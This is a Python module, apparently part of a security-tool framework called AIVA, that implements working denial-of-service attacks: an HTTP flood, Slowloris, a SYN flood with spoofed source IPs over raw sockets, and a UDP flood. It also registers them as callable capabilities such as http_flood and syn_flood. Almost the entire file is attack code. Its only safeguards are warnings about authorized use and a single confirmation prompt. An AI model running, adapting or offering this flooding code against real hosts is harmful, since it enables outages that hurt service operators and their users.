#!/usr/bin/env python3
"""
AIVA DDoS Attack Tools - Task 14
分散式拒絕服務攻擊工具集
⚠️ 僅用於授權的安全測試和教育目的 ⚠️
"""

import asyncio
import json
import logging
import os
import socket
import struct
import subprocess
import threading
import time
from dataclasses import dataclass, asdict
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple
from urllib.parse import urlparse
import random
import multiprocessing

import aiohttp
import requests
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.table import Table
from rich.text import Text

# 本地導入
from ...core.base_capability import BaseCapability
from ...aiva_common.schemas import APIResponse
from ...core.registry import CapabilityRegistry

console = Console()
logger = logging.getLogger(__name__)

# 常量定義
PROGRESS_DESC_TEMPLATE = "[progress.description]{task.description}"
SYN_FLOOD_TYPE = "SYN Flood"
MISSING_TARGET_URL_ERROR = "Missing target_url parameter"
ATTACK_CANCELLED_ERROR = "Attack cancelled"


@dataclass
class DDoSTarget:
    """DDoS 攻擊目標"""
    url: str
    ip: Optional[str] = None
    port: int = 80
    protocol: str = "HTTP"  # HTTP, HTTPS, TCP, UDP
    method: str = "GET"
    headers: Optional[Dict[str, str]] = None
    payload: Optional[str] = None
    threads: int = 100
    duration: int = 60  # 秒
    rate_limit: int = 1000  # 每秒請求數
    proxy_list: Optional[List[str]] = None
    
    def __post_init__(self):
        if self.headers is None:
            self.headers = {}
        if self.proxy_list is None:
            self.proxy_list = []
        
        # 從 URL 解析 IP 和端口
        if not self.ip:
            parsed = urlparse(self.url)
            self.ip = socket.gethostbyname(parsed.hostname)
            if not self.port or self.port == 80:
                self.port = 443 if parsed.scheme == 'https' else 80


@dataclass
class AttackResult:
    """攻擊結果"""
    target: str
    attack_type: str
    start_time: str
    end_time: str
    duration: float
    requests_sent: int
    successful_requests: int
    failed_requests: int
    avg_response_time: float
    max_response_time: float
    min_response_time: float
    bandwidth_used: float  # MB
    status: str  # Success, Failed, Interrupted
    error_details: Optional[str] = None
    
    def success_rate(self) -> float:
        if self.requests_sent == 0:
            return 0.0
        return (self.successful_requests / self.requests_sent) * 100


class HTTPFloodAttack:
    """HTTP 洪水攻擊"""
    
    def __init__(self, target: DDoSTarget):
        self.target = target
        self.session = None
        self.attack_active = False
        self.results = {
            'requests_sent': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'response_times': [],
            'bandwidth_used': 0
        }
    
    async def execute_attack(self) -> AttackResult:
        """執行 HTTP 洪水攻擊"""
        console.print(f"[bold red]🚀 開始 HTTP 洪水攻擊: {self.target.url}[/bold red]")
        console.print("[yellow]⚠️  僅用於授權測試！[/yellow]")
        
        start_time = datetime.now()
        self.attack_active = True
        
        # 創建 HTTP 會話
        connector = aiohttp.TCPConnector(
            limit=self.target.threads,
            limit_per_host=self.target.threads,
            ttl_dns_cache=300,
            use_dns_cache=True
        )
        
        timeout = aiohttp.ClientTimeout(total=30, connect=10)
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers=self._get_attack_headers()
        )
        
        try:
            # 創建攻擊任務
            tasks = []
            with Progress(
                SpinnerColumn(),
                TextColumn(PROGRESS_DESC_TEMPLATE),
                BarColumn(),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                console=console
            ) as progress:
                
                task_id = progress.add_task(
                    f"HTTP 攻擊中... 目標: {self.target.url}",
                    total=self.target.duration
                )
                
                # 啟動攻擊線程
                for i in range(self.target.threads):
                    task = asyncio.create_task(
                        self._attack_worker(i, progress, task_id)
                    )
                    tasks.append(task)
                
                # 等待攻擊完成或超時
                try:
                    await asyncio.wait_for(
                        asyncio.gather(*tasks, return_exceptions=True),
                        timeout=self.target.duration + 10
                    )
                except asyncio.TimeoutError:
                    console.print("[yellow]攻擊超時，正在停止...[/yellow]")
                    self.attack_active = False
                    
                    # 取消剩餘任務
                    for task in tasks:
                        if not task.done():
                            task.cancel()
        
        finally:
            await self.session.close()
            end_time = datetime.now()        # 生成攻擊結果
        duration = (end_time - start_time).total_seconds()
        
        result = AttackResult(
            target=self.target.url,
            attack_type="HTTP Flood",
            start_time=start_time.isoformat(),
            end_time=end_time.isoformat(),
            duration=duration,
            requests_sent=self.results['requests_sent'],
            successful_requests=self.results['successful_requests'],
            failed_requests=self.results['failed_requests'],
            avg_response_time=self._calculate_avg_response_time(),
            max_response_time=max(self.results['response_times']) if self.results['response_times'] else 0,
            min_response_time=min(self.results['response_times']) if self.results['response_times'] else 0,
            bandwidth_used=self.results['bandwidth_used'] / (1024 * 1024),  # 轉換為 MB
            status="Success" if self.results['requests_sent'] > 0 else "Failed"
        )
        
        console.print("[bold green]✅ HTTP 攻擊完成！[/bold green]")
        return result
    
    async def _attack_worker(self, worker_id: int, progress: Progress, task_id):
        """攻擊工作線程"""
        request_count = 0
        start_time = time.time()
        
        while self.attack_active and (time.time() - start_time) < self.target.duration:
            try:
                # 發送 HTTP 請求
                req_start = time.time()
                
                async with self.session.request(
                    self.target.method,
                    self.target.url,
                    data=self.target.payload,
                    headers=self.target.headers
                ) as response:
                    await response.read()  # 讀取響應內容
                    
                    req_end = time.time()
                    response_time = req_end - req_start
                    
                    # 記錄結果
                    self.results['requests_sent'] += 1
                    self.results['response_times'].append(response_time)
                    self.results['bandwidth_used'] += len(await response.read()) if hasattr(response, 'content') else 1024
                    
                    if response.status < 400:
                        self.results['successful_requests'] += 1
                    else:
                        self.results['failed_requests'] += 1
                
                request_count += 1
                
                # 更新進度
                if request_count % 10 == 0:
                    elapsed = time.time() - start_time
                    progress.update(task_id, completed=elapsed)
                
                # 速率限制
                if request_count % 100 == 0:
                    await asyncio.sleep(0.01)
                    
            except Exception as e:
                self.results['failed_requests'] += 1
                logger.debug(f"Worker {worker_id} 請求失敗: {e}")
                await asyncio.sleep(0.1)
    
    def _get_attack_headers(self) -> Dict[str, str]:
        """獲取攻擊請求頭"""
        base_headers = {
            'User-Agent': self._get_random_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache'
        }
        
        # 合併自定義頭部
        base_headers.update(self.target.headers)
        return base_headers
    
    def _get_random_user_agent(self) -> str:
        """獲取隨機 User-Agent"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0'
        ]
        return random.choice(user_agents)
    
    def _calculate_avg_response_time(self) -> float:
        """計算平均響應時間"""
        if not self.results['response_times']:
            return 0.0
        return sum(self.results['response_times']) / len(self.results['response_times'])


class SlowLorisAttack:
    """Slowloris 慢速攻擊"""
    
    def __init__(self, target: DDoSTarget):
        self.target = target
        self.sockets = []
        self.attack_active = False
    
    async def execute_attack(self) -> AttackResult:
        """執行 Slowloris 攻擊"""
        console.print(f"[bold red]🐌 開始 Slowloris 攻擊: {self.target.ip}:{self.target.port}[/bold red]")
        console.print("[yellow]⚠️  僅用於授權測試！[/yellow]")
        
        start_time = datetime.now()
        self.attack_active = True
        
        try:
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                console=console
            ) as progress:
                
                task_id = progress.add_task(
                    f"Slowloris 攻擊中... 目標: {self.target.ip}:{self.target.port}",
                    total=None
                )
                
                # 創建初始連接
                await self._create_connections()
                
                # 維持連接並發送慢速數據
                attack_duration = 0
                while self.attack_active and attack_duration < self.target.duration:
                    await self._send_partial_headers()
                    await asyncio.sleep(15)  # 每15秒發送一次部分頭部
                    attack_duration += 15
                    
                    progress.update(task_id, description=f"Slowloris 攻擊中... 活躍連接: {len(self.sockets)}")
        
        finally:
            await self._close_connections()
            end_time = datetime.now()
        
        duration = (end_time - start_time).total_seconds()
        
        result = AttackResult(
            target=f"{self.target.ip}:{self.target.port}",
            attack_type="Slowloris",
            start_time=start_time.isoformat(),
            end_time=end_time.isoformat(),
            duration=duration,
            requests_sent=len(self.sockets),
            successful_requests=len(self.sockets),
            failed_requests=0,
            avg_response_time=0,
            max_response_time=0,
            min_response_time=0,
            bandwidth_used=0.001,  # 極少的帶寬使用
            status="Success"
        )
        
        console.print("[bold green]✅ Slowloris 攻擊完成！[/bold green]")
        return result
    
    async def _create_connections(self):
        """創建慢速連接"""
        console.print(f"[cyan]正在創建 {self.target.threads} 個慢速連接...[/cyan]")
        
        for _ in range(self.target.threads):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((self.target.ip, self.target.port))
                
                # 發送部分 HTTP 請求頭
                request = f"GET /{self._random_string()} HTTP/1.1\r\n"
                request += f"Host: {self.target.ip}\r\n"
                request += f"User-Agent: {self._get_random_user_agent()}\r\n"
                request += "Accept-language: en-US,en,q=0.5\r\n"
                
                sock.send(request.encode('utf-8'))
                self.sockets.append(sock)
                
            except Exception as e:
                logger.debug(f"創建連接失敗: {e}")
                continue
        
        console.print(f"[green]✅ 成功創建 {len(self.sockets)} 個連接[/green]")
    
    async def _send_partial_headers(self):
        """發送部分頭部以維持連接"""
        for sock in self.sockets[:]:  # 創建副本以避免修改列表時的問題
            try:
                # 發送隨機頭部
                header = f"X-{self._random_string()}: {self._random_string()}\r\n"
                sock.send(header.encode('utf-8'))
            except Exception:
                # 連接已斷開，從列表中移除
                self.sockets.remove(sock)
                try:
                    sock.close()
                except:
                    pass
    
    async def _close_connections(self):
        """關閉所有連接"""
        for sock in self.sockets:
            try:
                sock.close()
            except:
                pass
        self.sockets.clear()
    
    def _random_string(self, length: int = 8) -> str:
        """生成隨機字符串"""
        chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        return ''.join(random.choice(chars) for _ in range(length))
    
    def _get_random_user_agent(self) -> str:
        """獲取隨機 User-Agent"""
        user_agents = [
            'Mozilla/5.0 (compatible; SlowHTTPTest)',
            'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1',
            'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0'
        ]
        return random.choice(user_agents)


class SYNFloodAttack:
    """SYN 洪水攻擊（需要 root 權限）"""
    
    def __init__(self, target: DDoSTarget):
        self.target = target
        self.attack_active = False
        self.packets_sent = 0
    
    async def execute_attack(self) -> AttackResult:
        """執行 SYN 洪水攻擊"""
        console.print(f"[bold red]⚡ 開始 SYN 洪水攻擊: {self.target.ip}:{self.target.port}[/bold red]")
        console.print("[yellow]⚠️  需要 root 權限！僅用於授權測試！[/yellow]")
        
        start_time = datetime.now()
        self.attack_active = True
        
        try:
            # 檢查是否有 root 權限
            if os.geteuid() != 0:
                console.print("[red]❌ SYN 洪水攻擊需要 root 權限[/red]")
                return AttackResult(
                    target=f"{self.target.ip}:{self.target.port}",
                    attack_type="SYN Flood",
                    start_time=start_time.isoformat(),
                    end_time=datetime.now().isoformat(),
                    duration=0,
                    requests_sent=0,
                    successful_requests=0,
                    failed_requests=1,
                    avg_response_time=0,
                    max_response_time=0,
                    min_response_time=0,
                    bandwidth_used=0,
                    status="Failed",
                    error_details="Insufficient privileges (root required)"
                )
            
            # 創建原始套接字
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            except PermissionError:
                console.print("[red]❌ 無法創建原始套接字，需要 root 權限[/red]")
                return AttackResult(
                    target=f"{self.target.ip}:{self.target.port}",
                    attack_type="SYN Flood",
                    start_time=start_time.isoformat(),
                    end_time=datetime.now().isoformat(),
                    duration=0,
                    requests_sent=0,
                    successful_requests=0,
                    failed_requests=1,
                    avg_response_time=0,
                    max_response_time=0,
                    min_response_time=0,
                    bandwidth_used=0,
                    status="Failed",
                    error_details="Cannot create raw socket"
                )
            
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                console=console
            ) as progress:
                
                task_id = progress.add_task(
                    f"SYN 洪水攻擊中... 目標: {self.target.ip}:{self.target.port}",
                    total=None
                )
                
                # 啟動多個攻擊線程
                tasks = []
                for _ in range(min(self.target.threads, 10)):  # 限制線程數
                    task = asyncio.create_task(
                        self._syn_flood_worker(sock, progress, task_id)
                    )
                    tasks.append(task)
                
                # 等待攻擊完成
                await asyncio.wait_for(
                    asyncio.gather(*tasks, return_exceptions=True),
                    timeout=self.target.duration
                )
            
            sock.close()
            
        except asyncio.TimeoutError:
            console.print("[yellow]SYN 攻擊超時，正在停止...[/yellow]")
            self.attack_active = False
        except Exception as e:
            console.print(f"[red]SYN 攻擊錯誤: {e}[/red]")
        finally:
            end_time = datetime.now()
        
        duration = (end_time - start_time).total_seconds()
        
        result = AttackResult(
            target=f"{self.target.ip}:{self.target.port}",
            attack_type="SYN Flood",
            start_time=start_time.isoformat(),
            end_time=end_time.isoformat(),
            duration=duration,
            requests_sent=self.packets_sent,
            successful_requests=self.packets_sent,
            failed_requests=0,
            avg_response_time=0,
            max_response_time=0,
            min_response_time=0,
            bandwidth_used=self.packets_sent * 0.06 / (1024 * 1024),  # 每個 SYN 包約 60 字節
            status="Success" if self.packets_sent > 0 else "Failed"
        )
        
        console.print(f"[bold green]✅ SYN 攻擊完成！發送了 {self.packets_sent} 個包[/bold green]")
        return result
    
    async def _syn_flood_worker(self, sock: socket.socket, progress: Progress, task_id):
        """SYN 洪水工作線程"""
        packet_count = 0
        start_time = time.time()
        
        while self.attack_active and (time.time() - start_time) < self.target.duration:
            try:
                # 構造 SYN 包
                packet = self._create_syn_packet()
                
                # 發送包
                sock.sendto(packet, (self.target.ip, self.target.port))
                self.packets_sent += 1
                packet_count += 1
                
                # 更新進度
                if packet_count % 1000 == 0:
                    progress.update(task_id, description=f"SYN 攻擊中... 已發送: {self.packets_sent} 包")
                
                # 小延遲以避免過載
                await asyncio.sleep(0.001)
                
            except Exception as e:
                logger.debug(f"SYN 包發送失敗: {e}")
                await asyncio.sleep(0.01)
    
    def _create_syn_packet(self) -> bytes:
        """創建 SYN 包"""
        # 簡化的 SYN 包構造（實際實現會更複雜）
        # 這裡只是示例，真實的 SYN 包需要正確的 IP 和 TCP 頭部
        
        # IP 頭部（簡化）
        ip_header = struct.pack('!BBHHHBBH4s4s', 
                               69,  # 版本和頭部長度
                               0,   # 服務類型
                               40,  # 總長度
                               random.randint(1, 65535),  # 標識
                               0,   # 標誌和偏移
                               255, # TTL
                               6,   # 協議（TCP）
                               0,   # 校驗和（稍後計算）
                               socket.inet_aton(self._get_random_ip()),  # 源 IP
                               socket.inet_aton(self.target.ip))         # 目標 IP
        
        # TCP 頭部（簡化）
        tcp_header = struct.pack('!HHLLBBHHH',
                                random.randint(1024, 65535),  # 源端口
                                self.target.port,             # 目標端口
                                random.randint(0, 2**32-1),   # 序列號
                                0,                             # 確認號
                                5 << 4,                        # 數據偏移
                                2,                             # 標誌（SYN）
                                65535,                         # 窗口大小
                                0,                             # 校驗和
                                0)                             # 緊急指針
        
        return ip_header + tcp_header
    
    def _get_random_ip(self) -> str:
        """生成隨機 IP 地址"""
        return f"{random.randint(1, 223)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"


class UDPFloodAttack:
    """UDP 洪水攻擊"""
    
    def __init__(self, target: DDoSTarget):
        self.target = target
        self.attack_active = False
        self.packets_sent = 0
    
    async def execute_attack(self) -> AttackResult:
        """執行 UDP 洪水攻擊"""
        console.print(f"[bold red]📡 開始 UDP 洪水攻擊: {self.target.ip}:{self.target.port}[/bold red]")
        console.print("[yellow]⚠️  僅用於授權測試！[/yellow]")
        
        start_time = datetime.now()
        self.attack_active = True
        
        try:
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                console=console
            ) as progress:
                
                task_id = progress.add_task(
                    f"UDP 洪水攻擊中... 目標: {self.target.ip}:{self.target.port}",
                    total=None
                )
                
                # 啟動攻擊線程
                tasks = []
                for _ in range(self.target.threads):
                    task = asyncio.create_task(
                        self._udp_flood_worker(progress, task_id)
                    )
                    tasks.append(task)
                
                # 等待攻擊完成
                await asyncio.wait_for(
                    asyncio.gather(*tasks, return_exceptions=True),
                    timeout=self.target.duration
                )
                
        except asyncio.TimeoutError:
            console.print("[yellow]UDP 攻擊超時，正在停止...[/yellow]")
            self.attack_active = False
        finally:
            end_time = datetime.now()
        
        duration = (end_time - start_time).total_seconds()
        
        result = AttackResult(
            target=f"{self.target.ip}:{self.target.port}",
            attack_type="UDP Flood",
            start_time=start_time.isoformat(),
            end_time=end_time.isoformat(),
            duration=duration,
            requests_sent=self.packets_sent,
            successful_requests=self.packets_sent,
            failed_requests=0,
            avg_response_time=0,
            max_response_time=0,
            min_response_time=0,
            bandwidth_used=self.packets_sent * 1.024 / (1024 * 1024),  # 每個包約 1KB
            status="Success" if self.packets_sent > 0 else "Failed"
        )
        
        console.print(f"[bold green]✅ UDP 攻擊完成！發送了 {self.packets_sent} 個包[/bold green]")
        return result
    
    async def _udp_flood_worker(self, progress: Progress, task_id):
        """UDP 洪水工作線程"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packet_count = 0
        start_time = time.time()
        
        # 生成隨機載荷
        payload = os.urandom(1024)  # 1KB 隨機數據
        
        try:
            while self.attack_active and (time.time() - start_time) < self.target.duration:
                try:
                    # 發送 UDP 包
                    sock.sendto(payload, (self.target.ip, self.target.port))
                    self.packets_sent += 1
                    packet_count += 1
                    
                    # 更新進度
                    if packet_count % 1000 == 0:
                        progress.update(task_id, description=f"UDP 攻擊中... 已發送: {self.packets_sent} 包")
                    
                    # 速率限制
                    await asyncio.sleep(0.001)
                    
                except Exception as e:
                    logger.debug(f"UDP 包發送失敗: {e}")
                    await asyncio.sleep(0.01)
                    
        finally:
            sock.close()


class DDoSManager:
    """DDoS 攻擊管理器"""
    
    def __init__(self):
        self.attack_results = []
        self.active_attacks = []
    
    def create_target(self, url: str, options: Dict[str, Any] = None) -> DDoSTarget:
        """創建攻擊目標"""
        options = options or {}
        
        return DDoSTarget(
            url=url,
            port=options.get('port', 80),
            protocol=options.get('protocol', 'HTTP'),
            method=options.get('method', 'GET'),
            headers=options.get('headers', {}),
            payload=options.get('payload'),
            threads=options.get('threads', 100),
            duration=options.get('duration', 60),
            rate_limit=options.get('rate_limit', 1000),
            proxy_list=options.get('proxy_list', [])
        )
    
    async def execute_attack(self, attack_type: str, target: DDoSTarget) -> AttackResult:
        """執行指定類型的攻擊"""
        
        # 安全警告
        console.print(Panel.fit(
            "[bold red]⚠️  安全警告 ⚠️[/bold red]\n\n"
            "[yellow]此工具僅用於:[/yellow]\n"
            "• 授權的滲透測試\n"
            "• 安全研究和教育\n"
            "• 自己擁有的系統測試\n\n"
            "[red]請勿用於未授權攻擊！[/red]\n"
            "[red]使用者需自行承擔法律責任！[/red]",
            border_style="red"
        ))
        
        if not Confirm.ask("您確認已獲得授權進行此測試嗎？"):
            console.print("[yellow]攻擊已取消[/yellow]")
            return None
        
        # 執行攻擊
        if attack_type.lower() == 'http':
            attack = HTTPFloodAttack(target)
        elif attack_type.lower() == 'slowloris':
            attack = SlowLorisAttack(target)
        elif attack_type.lower() == 'syn':
            attack = SYNFloodAttack(target)
        elif attack_type.lower() == 'udp':
            attack = UDPFloodAttack(target)
        else:
            raise ValueError(f"不支持的攻擊類型: {attack_type}")
        
        result = await attack.execute_attack()
        self.attack_results.append(result)
        
        return result
    
    def generate_report(self, results: List[AttackResult] = None) -> str:
        """生成攻擊報告"""
        if results is None:
            results = self.attack_results
        
        if not results:
            return "沒有攻擊結果可以生成報告"
        
        report = f"""
# 🚀 DDoS 攻擊測試報告
生成時間: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

## 📊 攻擊摘要
- 攻擊次數: {len(results)}
- 成功攻擊: {sum(1 for r in results if r.status == 'Success')}
- 失敗攻擊: {sum(1 for r in results if r.status == 'Failed')}

## 🎯 攻擊詳情
"""
        
        for i, result in enumerate(results, 1):
            report += f"""
### 攻擊 #{i}: {result.attack_type}
- **目標**: {result.target}
- **攻擊類型**: {result.attack_type}
- **持續時間**: {result.duration:.2f} 秒
- **發送請求**: {result.requests_sent:,}
- **成功請求**: {result.successful_requests:,}
- **失敗請求**: {result.failed_requests:,}
- **成功率**: {result.success_rate():.2f}%
- **平均響應時間**: {result.avg_response_time:.3f} 秒
- **帶寬使用**: {result.bandwidth_used:.2f} MB
- **狀態**: {result.status}
"""
            
            if result.error_details:
                report += f"- **錯誤詳情**: {result.error_details}\n"
        
        report += f"""
## ⚠️  免責聲明
此報告僅用於授權的安全測試目的。使用者需確保遵守相關法律法規，
並承擔使用此工具所產生的一切法律責任。

## 📝 建議
1. 確保所有測試都已獲得明確授權
2. 在測試前備份重要數據
3. 監控系統資源使用情況
4. 記錄所有測試活動以便審計
"""
        
        return report
    
    def show_attack_statistics(self):
        """顯示攻擊統計"""
        if not self.attack_results:
            console.print("[yellow]沒有攻擊結果可顯示[/yellow]")
            return
        
        # 統計表格
        table = Table(title="🚀 DDoS 攻擊統計")
        table.add_column("攻擊類型", style="cyan")
        table.add_column("目標", style="yellow")
        table.add_column("請求數", style="green")
        table.add_column("成功率", style="magenta")
        table.add_column("持續時間", style="blue")
        table.add_column("狀態", style="red")
        
        for result in self.attack_results:
            table.add_row(
                result.attack_type,
                result.target,
                f"{result.requests_sent:,}",
                f"{result.success_rate():.1f}%",
                f"{result.duration:.1f}s",
                result.status
            )
        
        console.print(table)


class DDoSCapability(BaseCapability):
    """DDoS 攻擊能力"""
    
    def __init__(self):
        super().__init__()
        self.name = "ddos_attack_tools"
        self.version = "1.0.0"
        self.description = "分散式拒絕服務攻擊工具集 - 僅用於授權測試"
        self.dependencies = ["aiohttp", "requests", "rich"]
        self.manager = DDoSManager()
    
    async def initialize(self) -> bool:
        """初始化能力"""
        try:
            console.print("[yellow]初始化 DDoS 攻擊工具集...[/yellow]")
            console.print("[red]⚠️  請確保僅用於授權測試！[/red]")
            return True
        except Exception as e:
            logger.error(f"初始化失敗: {e}")
            return False
    
    async def execute(self, command: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """執行命令"""
        try:
            if command == "http_flood":
                target_url = parameters.get('target_url')
                if not target_url:
                    return {"success": False, "error": "Missing target_url parameter"}
                
                target = self.manager.create_target(target_url, parameters.get('options', {}))
                result = await self.manager.execute_attack('http', target)
                
                if result:
                    return {"success": True, "data": asdict(result)}
                else:
                    return {"success": False, "error": "Attack cancelled"}
            
            elif command == "slowloris":
                target_url = parameters.get('target_url')
                if not target_url:
                    return {"success": False, "error": "Missing target_url parameter"}
                
                target = self.manager.create_target(target_url, parameters.get('options', {}))
                result = await self.manager.execute_attack('slowloris', target)
                
                if result:
                    return {"success": True, "data": asdict(result)}
                else:
                    return {"success": False, "error": "Attack cancelled"}
            
            elif command == "syn_flood":
                target_url = parameters.get('target_url')
                if not target_url:
                    return {"success": False, "error": "Missing target_url parameter"}
                
                target = self.manager.create_target(target_url, parameters.get('options', {}))
                result = await self.manager.execute_attack('syn', target)
                
                if result:
                    return {"success": True, "data": asdict(result)}
                else:
                    return {"success": False, "error": "Attack cancelled or failed"}
            
            elif command == "udp_flood":
                target_url = parameters.get('target_url')
                if not target_url:
                    return {"success": False, "error": "Missing target_url parameter"}
                
                target = self.manager.create_target(target_url, parameters.get('options', {}))
                result = await self.manager.execute_attack('udp', target)
                
                if result:
                    return {"success": True, "data": asdict(result)}
                else:
                    return {"success": False, "error": "Attack cancelled"}
            
            elif command == "generate_report":
                report = self.manager.generate_report()
                return {"success": True, "data": {"report": report}}
            
            elif command == "show_statistics":
                self.manager.show_attack_statistics()
                return {"success": True, "message": "Statistics displayed"}
            
            else:
                return {"success": False, "error": f"Unknown command: {command}"}
                
        except Exception as e:
            logger.error(f"命令執行失敗: {e}")
            return {"success": False, "error": str(e)}
    
    async def cleanup(self) -> bool:
        """清理資源"""
        try:
            self.manager.attack_results.clear()
            self.manager.active_attacks.clear()
            return True
        except Exception as e:
            logger.error(f"清理失敗: {e}")
            return False


# 註冊能力
CapabilityRegistry.register("ddos_attack_tools", DDoSCapability)


if __name__ == "__main__":
    # 測試用例
    async def test_ddos_tools():
        capability = DDoSCapability()
        await capability.initialize()
        
        console.print("[bold red]⚠️  這只是演示，請勿對未授權目標執行實際攻擊！[/bold red]")
        
        await capability.cleanup()
    
    # 運行測試
    asyncio.run(test_ddos_tools())